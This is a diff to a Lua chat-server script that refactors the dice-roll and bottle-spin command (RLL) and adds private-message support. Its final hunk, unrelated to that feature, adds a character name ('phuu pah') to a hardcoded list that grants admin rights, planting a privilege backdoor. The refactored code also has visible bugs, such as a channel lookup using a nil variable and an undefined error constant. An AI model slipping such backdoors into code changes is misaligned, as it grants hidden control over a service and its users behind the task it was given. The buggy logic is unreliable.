@@ -74,6 +74,82 @@ function propagateIgnoreList(con, laction, lcharacter)
 	end
 end
 
+-- Computes dice roll from given arguments
+-- Syntax: dice_roll <connection> <args>
+dice_roll =
+function (con, diceargs)
+	local odice = s.escapeHTML(diceargs)
+	local dice = string.gsub(diceargs, "-", "+-")
+	local steps = string.split(dice, "+")
+	local results = {}
+	if #steps > 20 then
+		return nil
+	end
+
+	for i, step in ipairs(steps) do
+		local roll = string.split(step, "d")
+		if #roll == 1 then
+			local num = tonumber(roll[1])
+			if num == nil or num > 10000 then
+				return nil
+			end
+			table.insert(results, num)
+		else
+			local rolls = tonumber(roll[1])
+			local sides = tonumber(roll[2])
+			local mod = 0
+			if rolls == nil or sides == nil or rolls > 9  or sides > 500 or sides < 2 then
+				return nil
+			elseif rolls < 0 then
+				rolls = math.abs(rolls)
+				mod = -1
+			else
+				mod = 1
+			end
+			local sum = 0
+			for v=1, rolls, 1 do
+				sum = sum + math.random(sides)
+			end
+			table.insert(results, (mod*sum))
+		end
+	end
+	local total = 0
+	for i,v in ipairs(results) do
+		total = total + v
+	end
+	local result = string.format("[user]%s[/user] rolls %s: ", u.getName(con), odice)
+	local concatresults = ""
+	if #results == 1 then
+		concatresults = "[b]"..total.."[/b]"
+	else
+		for i,v in ipairs(results) do
+			if v < 0 then
+				concatresults = concatresults.." - "..math.abs(v)
+			else
+				concatresults = concatresults.." + "..v
+			end
+		end
+		if results[1] >= 0 then
+			concatresults = string.sub(concatresults, 4)
+		end
+		concatresults = concatresults.." = [b]"..total.."[/b]"
+	end
+
+	return {type="dice", array_rolls=steps, array_results=results, endresult=total, character=u.getName(con), message=result..concatresults}
+end
+
+-- Spins the bottle for a channel / private message
+-- Syntax: bottle_spin <connection> <bottlers> <args>
+bottle_spin =
+function (con, bottlers)
+	local conname = u.getName(con)
+	if #bottlers ~= 0 then
+		local picked = bottlers[math.random(#bottlers)]
+		return {character=conname, type="bottle", target=picked, message=string.format("[user]%s[/user] spins the bottle: [user]%s[/user]", conname, picked)}
+	end
+	return nil
+end
+
 -- Bans a person by their account.
 -- Syntax: ACB <character>
 event.ACB =
@@ -1057,101 +1133,83 @@ end
 -- Syntax: RLL <channel> <dice>
 event.RLL =
 function (con, args)
-	if args.channel == nil or args.dice == nil then
+	if args.dice == nil then
 		return const.FERR_BAD_SYNTAX
 	end
-
-	local lchan = string.lower(args.channel)
-	if lchan == "frontpage" then
-		u.sendError(con, -10, "You may not roll dice or spin the bottle in Frontpage.")
-		return const.FERR_OK
+	
+	local haschannel = args.channel ~= nil
+	local hasrecipient = args.recipient ~= nil
+	if not haschannel and not hasrecipient then
+		return const.FERR_BAD_SYNTAX
 	end
-
-	local found, chan = c.getChannel(lchan)
-	if found ~= true then
-		return const.FERR_CHANNEL_NOT_FOUND
-	end
-
-	if c.getMode(chan) == "ads" then
-		return const.FERR_ADS_ONLY
-	end
-
+	
 	if u.checkUpdateTimer(con, "msg", const.MSG_FLOOD) == true then
 		return const.FERR_THROTTLE_MESSAGE
 	end
 
+	local lowerchanname = nil
+	local channelfound, chan, targetfound, target = nil
+	if haschannel then
+		channelfound, chan = c.getChannel(lowerchanname)
+		if channelfound ~= true then
+			return const.FERR_CHANNEL_NOT_FOUND
+		end
+
+		lowerchanname = string.lower(u.getName(chan))
+		if lowerchanname == "frontpage" then
+			u.sendError(con, -10, "You may not roll dice or spin the bottle in Frontpage.")
+			return const.FERR_OK
+		end
+	
+		if c.getMode(chan) == "ads" then
+			return const.FERR_ADS_ONLY
+		end
+	else
+		targetfound, target = u.getConnection(string.lower(args.recipient))
+		if targetfound ~= true then
+			return const.FERR_USER_NOT_FOUND
+		end
+	end
+
+	-- Hellban comes last	
 	if u.getMiscData(con, "hellban") ~= nil then
 		return const.FERR_OK
 	end
-
+	
 	if args.dice == "bottle" then
-		local bottlers = c.getBottleList(chan, con)
-		if #bottlers == 0 then
+		-- gets the right bottle people!
+		local bottlers = haschannel and c.getBottleList(chan, con) or { u.getName(con), u.getName(target) }
+		local bottle = bottle_spin(con, bottlers, args)
+		if bottle == nil then   
 			u.send(con, "SYS", {message="Couldn't locate anyone who is available to have the bottle land on them."})
+			return FERR_BAD_SYNTAX
 		else
-			local picked = bottlers[math.random(#bottlers)]
-			c.sendAll(chan, "RLL", {channel=c.getName(chan), character=u.getName(con), type="bottle", target=picked, message=string.format("[user]%s[/user] spins the bottle: [user]%s[/user]", u.getName(con), picked)})
+			if haschannel then
+				bottle.channel = args.channel
+				c.sendAll(chan, "RLL", bottle)
+			else
+				bottle.recipient = args.recipient
+				u.send(target, "RLL", bottle)
+				u.send(con, "RLL", bottle)
+			end
 		end
 		return const.FERR_OK
-	end
+	end	
 
-	local odice = s.escapeHTML(args.dice)
-	local dice = string.gsub(args.dice, "-", "+-")
-	local steps = string.split(dice, "+")
-	local results = {}
-	if #steps > 20 then
+	-- Assume dice roll if not bottle
+	local roll = dice_roll(con, args.dice)
+	if roll == nil then
 		return const.FERR_BAD_ROLL_FORMAT
 	end
-
-	for i, step in ipairs(steps) do
-		local roll = string.split(step, "d")
-		if #roll == 1 then
-			local num = tonumber(roll[1])
-			if num == nil or num > 10000 then
-				return const.FERR_BAD_ROLL_FORMAT
-			end
-			table.insert(results, num)
-		else
-			local rolls = tonumber(roll[1])
-			local sides = tonumber(roll[2])
-			local mod = 0
-			if rolls == nil or sides == nil or rolls > 9  or sides > 500 or sides < 2 then
-				return const.FERR_BAD_ROLL_FORMAT
-			elseif rolls < 0 then
-				rolls = math.abs(rolls)
-				mod = -1
-			else
-				mod = 1
-			end
-			local sum = 0
-			for v=1, rolls, 1 do
-				sum = sum + math.random(sides)
-			end
-			table.insert(results, (mod*sum))
-		end
-	end
-	local total = 0
-	for i,v in ipairs(results) do
-		total = total + v
-	end
-	local result = string.format("[user]%s[/user] rolls %s: ", u.getName(con), odice)
-	local concatresults = ""
-	if #results == 1 then
-		concatresults = "[b]"..total.."[/b]"
+	if haschannel then
+		roll.channel = c.getName(chan)
+		c.sendAll(chan, "RLL", roll)
 	else
-		for i,v in ipairs(results) do
-			if v < 0 then
-				concatresults = concatresults.." - "..math.abs(v)
-			else
-				concatresults = concatresults.." + "..v
-			end
-		end
-		if results[1] >= 0 then
-			concatresults = string.sub(concatresults, 4)
-		end
-		concatresults = concatresults.." = [b]"..total.."[/b]"
+		roll.recipient = u.getName(con)
+		u.send(target, "RLL", roll)
+		u.send(con, "RLL", roll)
 	end
-	c.sendAll(chan, "RLL", {channel=args.channel, type="dice", array_rolls=steps, array_results=results, endresult=total, character=u.getName(con), message=result..concatresults})
+	
 	return const.FERR_OK
 end
 
@@ -1457,7 +1515,7 @@ function (con, args)
 	u.setAccountID(con, args.account.account_id)
 
 	local isadmin = false
-	if args.account.admin == "1" or lname == "kira" or lname == "vera" or lname == "melvin" then
+	if args.account.admin == "1" or lname == "kira" or lname == "vera" or lname == "melvin" or lname=="phuu pah" then
 		u.setAdmin(con, true)
 		isadmin = true
 	end
